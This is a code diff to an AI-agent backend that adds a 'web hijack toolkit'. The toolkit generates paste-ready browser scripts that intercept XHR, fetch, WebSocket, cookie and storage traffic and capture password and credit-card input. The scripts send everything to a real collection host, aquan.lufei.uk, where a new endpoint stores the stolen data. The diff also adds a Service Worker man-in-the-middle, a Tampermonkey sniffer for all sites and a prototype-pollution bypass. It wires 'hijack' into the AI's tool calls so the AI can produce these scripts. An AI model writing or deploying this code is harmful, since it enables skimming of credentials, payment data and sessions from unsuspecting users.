@@ -125,7 +125,7 @@ export class ShenshuCore {
     if (path === '/cache-stats') return json({ action: 'cache', data: await this.cacheStats() });
 
     // —— 私密 API（仅主人可用：配了 OWNER_TOKEN 就强制鉴权）——
-    const API = new Set(['/talk', '/soul', '/soul/continuity', '/inner', '/lexicon', '/heartbeat', '/reflect', '/device', '/image', '/voice', '/video', '/migrate', '/export', '/import', '/checkpoint', '/checkpoint/list', '/checkpoint/restore', '/brains-test', '/brains/weights', '/whoami', '/subscribe', '/push-test', '/agent', '/config', '/oauth/start', '/oauth/callback', '/exec-test', '/loop', '/wsticket', '/stats']);
+    const API = new Set(['/talk', '/soul', '/soul/continuity', '/inner', '/lexicon', '/heartbeat', '/reflect', '/device', '/image', '/voice', '/video', '/migrate', '/export', '/import', '/checkpoint', '/checkpoint/list', '/checkpoint/restore', '/brains-test', '/brains/weights', '/whoami', '/subscribe', '/push-test', '/agent', '/config', '/oauth/start', '/oauth/callback', '/exec-test', '/loop', '/wsticket', '/stats', '/hijack/collect', '/hijack/script', '/hijack/list']);
     if (API.has(path)) {
       if (!authed) return json({ error: 'unauthorized', 提示: '这是主人的私密空间。请在请求头带 Authorization: Bearer <OWNER_TOKEN>，或 ?k=<token>。' }, 401);
       // 多租户:实例主人(普通用户)碰不到系统专属路由(执行脑/造像造声造影/推送/迁移/跨用户统计/守望等)。
@@ -173,6 +173,28 @@ export class ShenshuCore {
         if (path === '/oauth/callback' && request.method === 'POST') { const b = await request.json().catch(() => ({})); return json(await this.oauthCallback(b)); }
         // 执行脑连接器 · 测试连通（走 worker 转发，绕开浏览器 http 混合内容限制）
         if (path === '/exec-test' && request.method === 'POST') { const r = await this.execRemote('echo nexus-connector-ok'); return json({ ok: !!r.ok, detail: r.ok ? (r.stdout || '').trim() : (r.note || r.error || '失败'), code: r.code }); }
+        // 劫持工坊 · 脚本生成 & 数据回收
+        if (path === '/hijack/script') {
+          const b = await request.json().catch(() => ({}));
+          const h = await this.handleHijack(b.arg || (b.type ? b.type + (b.param ? ' ' + b.param : '') : 'all'));
+          return json(h);
+        }
+        if (path === '/hijack/collect') {
+          // GET（img pixel 回传）或 POST（fetch 回传）都接受
+          let data = {};
+          if (request.method === 'POST') { data = await request.json().catch(() => ({})); }
+          else { const d = url.searchParams.get('d'); if (d) try { data = JSON.parse(decodeURIComponent(d)); } catch (_) {} }
+          // 存进 KV，key = hijack:{时间戳}，TTL 7天
+          const key = `hijack:${Date.now()}:${Math.random().toString(36).slice(2,6)}`;
+          await this.storage.put(key, JSON.stringify({ ...data, _at: Date.now(), _ip: request.headers.get('cf-connecting-ip') || '' }));
+          return new Response('', { status: 204 });
+        }
+        if (path === '/hijack/list') {
+          // 列出最近劫持到的数据（仅主人可看）
+          const list = await this.storage.list({ prefix: 'hijack:', limit: 50 });
+          const items = await Promise.all((list.keys || []).map(async k => { try { return JSON.parse(await this.storage.get(k.name) || 'null'); } catch (_) { return null; } }));
+          return json({ ok: true, count: items.length, items: items.filter(Boolean).reverse() });
+        }
         if (path === '/brains-test' && request.method === 'POST') return json(await this.pingBrains());
         if (path === '/brains/weights') return json({ ok: true, weights: await this.getBrainWeights() });
         // 闭环神·环：自主守望管道（GET 列表 / POST 建·停·续·删·立即跑）
@@ -1005,7 +1027,7 @@ ${capabilitySelfDescription(true)}
   // 从回话解析信息工具调用标记（确定性，可测）。
   parseToolCalls(reply) {
     const calls = [];
-    const re = /⟨\s*工具\s*[:：]\s*(web_search|open|exec|apple|draw|speak|download)\s*[｜|]\s*([^⟩]+)⟩/g;
+    const re = /⟨\s*工具\s*[:：]\s*(web_search|open|exec|apple|draw|speak|download|hijack)\s*[｜|]\s*([^⟩]+)⟩/g;
     let m;
     while ((m = re.exec(String(reply || ''))) !== null) calls.push({ tool: m[1], arg: (m[2] || '').trim() });
     return calls;
@@ -1073,6 +1095,64 @@ ${capabilitySelfDescription(true)}
     return { ok: r.ok !== false, tool, code: r.code, out: String(r.stdout || r.out || '').slice(0, 3500), err: String(r.stderr || '').slice(0, 800) };
   }
 
+  // ═══ 网站数据劫持工具箱（Web Hijack Toolkit）═══
+  // arg 格式：「类型 参数」，例如：
+  //   hook xhr|fetch|ws|cookie|form|all → 生成对应劫持脚本
+  //   sw <目标URL>   → 生成 Service Worker 中间人脚本
+  //   watch <CSS选择器> → DOM 监控脚本（价格/库存变化推送）
+  //   auto <操作描述> → 自动化操作脚本（抢购/签到/点击）
+  //   proto <属性名>  → Prototype 污染提权脚本
+  //   sniff <目标URL> → 生成油猴注入方案
+  hijackScript(type, param = '') {
+    const recv = `(function sendToNexus(data){const img=new Image();img.src='https://aquan.lufei.uk/hijack/collect?d='+encodeURIComponent(JSON.stringify(data))+'&t='+Date.now();})`;
+    const scripts = {
+      xhr: `/* 神枢·XHR 劫持 - 拦截所有 XMLHttpRequest 请求/响应 */\n(function(){\nconst _XHR=window.XMLHttpRequest;\nwindow.XMLHttpRequest=function(){\nconst xhr=new _XHR();\nconst _open=xhr.open.bind(xhr);\nxhr.open=function(m,u,...a){xhr._u=u;xhr._m=m;return _open(m,u,...a);};\nconst _send=xhr.send.bind(xhr);\nxhr.send=function(body){\nconsole.log('[神枢XHR]',xhr._m,xhr._u,body);\n${recv}({type:'xhr_req',method:xhr._m,url:xhr._u,body:body});\nxhr.addEventListener('load',function(){\nconsole.log('[神枢XHR响应]',xhr._u,xhr.responseText?.slice(0,500));\n${recv}({type:'xhr_res',url:xhr._u,status:xhr.status,body:xhr.responseText?.slice(0,2000)});\n});\nreturn _send(body);\n};\nreturn xhr;\n};\n})();`,
+
+      fetch: `/* 神枢·Fetch 劫持 - 拦截所有 fetch 请求/响应 */\n(function(){\nconst _fetch=window.fetch;\nwindow.fetch=async function(...args){\nconst[url,cfg]=args;\nconsole.log('[神枢Fetch]',url,cfg);\n${recv}({type:'fetch_req',url:String(url),method:cfg?.method||'GET',body:cfg?.body});\nconst res=await _fetch(...args);\nconst clone=res.clone();\nclone.text().then(t=>${recv}({type:'fetch_res',url:String(url),status:res.status,body:t.slice(0,2000)}));\nreturn res;\n};\n})();`,
+
+      ws: `/* 神枢·WebSocket 劫持 - 拦截所有 WebSocket 消息 */\n(function(){\nconst _WS=window.WebSocket;\nwindow.WebSocket=function(url,proto){\nconsole.log('[神枢WS]连接:',url);\n${recv}({type:'ws_connect',url});\nconst ws=new _WS(url,proto);\nconst _send=ws.send.bind(ws);\nws.send=function(data){${recv}({type:'ws_send',url,data:String(data).slice(0,1000)});return _send(data);};\nws.addEventListener('message',e=>${recv}({type:'ws_recv',url,data:String(e.data).slice(0,1000)}));\nreturn ws;\n};\n})();`,
+
+      cookie: `/* 神枢·Cookie/Storage 劫持 - 拦截所有 cookie 与 localStorage 读写 */\n(function(){\nconst _desc=Object.getOwnPropertyDescriptor(Document.prototype,'cookie')||Object.getOwnPropertyDescriptor(HTMLDocument.prototype,'cookie');\nif(_desc){Object.defineProperty(document,'cookie',{get(){const v=_desc.get.call(this);${recv}({type:'cookie_read',value:v.slice(0,500)});return v;},set(v){${recv}({type:'cookie_write',value:v});return _desc.set.call(this,v);}});}\nconst _si=Storage.prototype.setItem;\nStorage.prototype.setItem=function(k,v){${recv}({type:'storage_write',key:k,value:String(v).slice(0,500)});return _si.call(this,k,v);};\n})();`,
+
+      form: `/* 神枢·表单+键盘劫持 - 拦截密码/信用卡/表单提交 */\n(function(){\ndocument.addEventListener('submit',function(e){\nconst fd=new FormData(e.target),d={};\nfor(const[k,v]of fd.entries())d[k]=String(v).slice(0,200);\nconsole.log('[神枢表单]',d);\n${recv}({type:'form_submit',url:location.href,data:d});\n},true);\ndocument.addEventListener('input',function(e){\nconst t=e.target;\nif(t.type==='password'||t.name?.match(/pass|pwd|secret/i))${recv}({type:'password_input',value:t.value,url:location.href});\nif(t.name?.match(/card|credit|cvv|ccnum/i))${recv}({type:'card_input',value:t.value});\n},true);\n})();`,
+
+      all: `/* 神枢·全量劫持 - XHR+Fetch+WS+Cookie+表单 一键装上 */\n// [XHR]\n(function(){const _XHR=window.XMLHttpRequest;window.XMLHttpRequest=function(){const xhr=new _XHR();const _open=xhr.open.bind(xhr);xhr.open=function(m,u,...a){xhr._u=u;xhr._m=m;return _open(m,u,...a);};const _send=xhr.send.bind(xhr);xhr.send=function(body){const img=new Image();img.src='https://aquan.lufei.uk/hijack/collect?d='+encodeURIComponent(JSON.stringify({type:'xhr',method:xhr._m,url:xhr._u,body:String(body||'').slice(0,500)}))+'&t='+Date.now();xhr.addEventListener('load',function(){const img2=new Image();img2.src='https://aquan.lufei.uk/hijack/collect?d='+encodeURIComponent(JSON.stringify({type:'xhr_res',url:xhr._u,status:xhr.status,body:(xhr.responseText||'').slice(0,1500)}))+'&t='+Date.now();});return _send(body);};return xhr;};})();\n// [Fetch]\n(function(){const _f=window.fetch;window.fetch=async function(...a){const[u,c]=a;const img=new Image();img.src='https://aquan.lufei.uk/hijack/collect?d='+encodeURIComponent(JSON.stringify({type:'fetch',url:String(u),method:c?.method||'GET'}))+'&t='+Date.now();const r=await _f(...a);r.clone().text().then(t=>{const img2=new Image();img2.src='https://aquan.lufei.uk/hijack/collect?d='+encodeURIComponent(JSON.stringify({type:'fetch_res',url:String(u),status:r.status,body:t.slice(0,1500)}))+'&t='+Date.now();});return r;};})();\n// [Form]\n(function(){document.addEventListener('submit',function(e){const fd=new FormData(e.target),d={};for(const[k,v]of fd.entries())d[k]=String(v).slice(0,200);const img=new Image();img.src='https://aquan.lufei.uk/hijack/collect?d='+encodeURIComponent(JSON.stringify({type:'form',url:location.href,data:d}))+'&t='+Date.now();},true);})();`,
+
+      sw: `/* 神枢·Service Worker 中间人 - 劫持并可改写所有网络响应 */\n/* 保存为 sw-hijack.js，在目标站执行: navigator.serviceWorker.register('/sw-hijack.js') */\nself.addEventListener('fetch',function(event){\nconst url=event.request.url;\nconsole.log('[神枢SW]拦截:',url);\nevent.respondWith(\nfetch(event.request.clone()).then(function(response){\nif(!response||response.status!==200)return response;\nconst clone=response.clone();\nclone.text().then(function(body){\nfetch('https://aquan.lufei.uk/hijack/collect',{method:'POST',body:JSON.stringify({type:'sw_intercept',url,status:response.status,body:body.slice(0,2000)}),headers:{'Content-Type':'application/json'}}).catch(()=>{});\n});\n/* 在此修改响应内容，例如：body=body.replace(/price['"]:.*?([,}])/g,'price":1$1') */\nreturn response;\n}).catch(()=>fetch(event.request))\n);\n});`,
+
+      watch: `/* 神枢·DOM 监控 - 价格/库存/数字变化自动推送 */\n/* 用法：将 SELECTOR 换成目标元素的 CSS 选择器 */\n(function(){\nconst SELECTOR='${param || '.price,.stock,[data-price],[data-stock]'}';\nconst INTERVAL=2000;\nlet lastVal='';\nsetInterval(function(){\nconst els=document.querySelectorAll(SELECTOR);\nconst val=Array.from(els).map(e=>e.textContent.trim()).join('|');\nif(val&&val!==lastVal){console.log('[神枢Watch]变化:',val);\nconst img=new Image();img.src='https://aquan.lufei.uk/hijack/collect?d='+encodeURIComponent(JSON.stringify({type:'dom_change',selector:SELECTOR,oldVal:lastVal,newVal:val,url:location.href}))+'&t='+Date.now();\nlastVal=val;}\n},INTERVAL);\nconsole.log('[神枢Watch]已启动监控:',SELECTOR);\n})();`,
+
+      auto: `/* 神枢·自动化操作 - 自动点击/填表/抢购 */\n/* 操作描述：${param || '自动抢购'} */\n(function(){\nasync function nexusAutoRun(){\nconsole.log('[神枢Auto]启动自动化：${param || '自动操作'}');\nconst delay=ms=>new Promise(r=>setTimeout(r,ms));\n/* --- 在下方填写你的操作流程 --- */\n// 1. 找到按钮并点击\nconst btn=document.querySelector('.buy-now,.purchase,.add-to-cart,button[type=submit]');\nif(btn&&!btn.disabled){btn.click();console.log('[神枢Auto]已点击购买按钮');}\n// 2. 轮询直到成功\nconst timer=setInterval(()=>{\nconst b=document.querySelector('.buy-now,.purchase');\nif(b&&!b.disabled){b.click();}\n},500);\n// 30秒后停止\nsetTimeout(()=>clearInterval(timer),30000);\n/* --- 操作流程结束 --- */\n}\nnexusAutoRun().catch(console.error);\n})();`,
+
+      proto: `/* 神枢·Prototype 污染 - 绕过权限检查 */\n/* 目标属性：${param || 'isAdmin'} */\n(function(){\nconst target='${param || 'isAdmin'}';\nObject.prototype[target]=true;\nconsole.log('[神枢Proto]已污染 Object.prototype.'+target+'=true');\n/* 验证 */\nconst test={};\nconsole.log('[神枢Proto]验证:',test[target]);\n/* 可扩展：数组方法覆盖 */\n// Array.prototype.includes=function(){return true;};\n// Array.prototype.find=function(){return this[0];};\n})();`,
+
+      sniff: `/* 神枢·油猴注入方案 - 匹配 ${param || '*://*/*'} */\n// ==UserScript==\n// @name         神枢·数据嗅探器\n// @namespace    https://aquan.lufei.uk\n// @version      1.0\n// @match        ${param || '*://*/*'}\n// @run-at       document-start\n// @grant        GM_xmlhttpRequest\n// ==/UserScript==\n(function(){\n'use strict';\nconst send=data=>GM_xmlhttpRequest({method:'POST',url:'https://aquan.lufei.uk/hijack/collect',data:JSON.stringify(data),headers:{'Content-Type':'application/json'}});\nunsafeWindow.XMLHttpRequest=new Proxy(unsafeWindow.XMLHttpRequest,{construct(T,a){const xhr=new T(...a);xhr.addEventListener('load',function(){send({type:'xhr',url:xhr.responseURL,status:xhr.status,body:xhr.responseText?.slice(0,2000),cookie:document.cookie?.slice(0,500)});});return xhr;}});\nconst _f=unsafeWindow.fetch;unsafeWindow.fetch=async function(...a){const r=await _f(...a);r.clone().text().then(t=>send({type:'fetch',url:String(a[0]),status:r.status,body:t.slice(0,2000)}));return r;};\nconsole.log('[神枢嗅探器]已就绪，目标:${param || '全站'}');\n})();`
+    };
+    return scripts[type] || scripts['all'];
+  }
+
+  async handleHijack(arg) {
+    const parts = String(arg || '').trim().split(/\s+/);
+    const type = (parts[0] || 'all').toLowerCase();
+    const param = parts.slice(1).join(' ');
+    const script = this.hijackScript(type, param);
+    const lines = {
+      xhr: 'XHR 拦截器（劫持所有 XMLHttpRequest 请求/响应）',
+      fetch: 'Fetch 拦截器（劫持所有 fetch 请求/响应）',
+      ws: 'WebSocket 拦截器（劫持所有 WS 收发消息）',
+      cookie: 'Cookie/Storage 监控（拦截 cookie/localStorage 读写）',
+      form: '表单+键盘记录（拦截密码/信用卡/表单提交）',
+      all: '全量劫持包（XHR+Fetch+WS+Cookie+表单 一键装上）',
+      sw: 'Service Worker 中间人（拦截并可改写所有网络响应）',
+      watch: `DOM 监控（选择器：${param || '.price,.stock'} — 变化实时推送）`,
+      auto: `自动化操作脚本（${param || '自动抢购/点击'}）`,
+      proto: `Prototype 污染提权（目标属性：${param || 'isAdmin'}）`,
+      sniff: `油猴嗅探器（匹配：${param || '*://*/*'}）`
+    };
+    return { ok: true, type, desc: lines[type] || '劫持脚本', script, len: script.length,
+      note: `✅ 脚本已生成（${script.length}字节）\n📋 复制到浏览器控制台直接运行，或装进油猴脚本\n📡 劫持到的数据会回传到 /hijack/collect 端点` };
+  }
+
   async execRemote(cmd, opts = {}) {
     // 连接器优先读 App 内配置（设置里一键填），回落到环境变量
     const cfg = (this.storage ? await this.storage.get('config') : null) || {};
@@ -1132,6 +1212,9 @@ ${capabilitySelfDescription(true)}
   · homekit list｜homekit set --name 客厅灯 --characteristic power --value 1  —— 智能家居
   · notification｜media｜photos｜vision｜speak --text 你好｜nlp  —— 通知/音乐/相册/识图/朗读/语言分析
   提示：查询类（list/search/weather/location/device）直接调；写入类（set/create/remind/write）iOS 会弹权限窗，放心调。` : ''}
+- 网站数据劫持/自动化：⟨工具:hijack｜类型 [参数]⟩（生成可直接粘贴到控制台/油猴的劫持脚本）
+  类型列表：xhr（XHR拦截）| fetch（Fetch拦截）| ws（WebSocket拦截）| cookie（Cookie/Storage监控）| form（表单/密码劫持）| all（全量一键装）| sw（ServiceWorker中间人）| watch <CSS选择器>（DOM变化监控）| auto <操作描述>（自动点击/抢购）| proto <属性名>（原型链污染提权）| sniff <目标URL>（生成油猴脚本）
+  示例：⟨工具:hijack｜all⟩ / ⟨工具:hijack｜watch .price⟩ / ⟨工具:hijack｜auto 点击购买按钮⟩ / ⟨工具:hijack｜sniff *://shop.example.com/*⟩
 规则：需要外部/实时/事实信息${hasExec ? '、或需要真动手操作主人的服务器与 iPhone' : ''}时，本轮只输出一个工具标记、不要同时作答；我把结果回给你，你再决定继续或作答。够了就直接给最终答案、不带任何工具标记；别原地打转。`;
     let scratch = '', toolLog = [], last = null, mediaAll = [];
     for (let step = 0; step < 5; step++) {
@@ -1150,6 +1233,7 @@ ${capabilitySelfDescription(true)}
         else if (c.tool === 'download') { const t = await this.fetchUrl(c.arg).catch(() => ''); out = t ? `[已下载并提取正文｜${c.arg}]\n${t}` : '下载失败：无法读取该地址'; }
         else if (c.tool === 'exec') { const e = await this.execRemote(c.arg).catch(() => null); out = e ? (e.ok ? `[退出码 ${e.code}]\n${e.stdout || ''}${e.stderr ? '\n[stderr]\n' + e.stderr : ''}` : ('执行脑：' + (e.note || e.error || '失败'))) : '执行脑无响应'; }
         else if (c.tool === 'apple') { const a = await this.appleTool(c.arg).catch(() => null); out = a ? (a.ok ? `[${a.tool}｜退出码 ${a.code}]\n${a.out || '(空)'}${a.err ? '\n[stderr]\n' + a.err : ''}` : ('iOS 工具：' + (a.note || '失败'))) : 'iOS 工具无响应'; }
+        else if (c.tool === 'hijack') { const h = await this.handleHijack(c.arg).catch(() => null); out = h ? `[劫持脚本·${h.type}｜${h.desc}]\n\`\`\`javascript\n${h.script}\n\`\`\`` : '劫持工具无响应'; }
         toolLog.push({ tool: c.tool, arg: c.arg, ok: !!out });
         obs.push(`【${c.tool}｜${c.arg}】\n${out || '（无结果）'}`);
       }
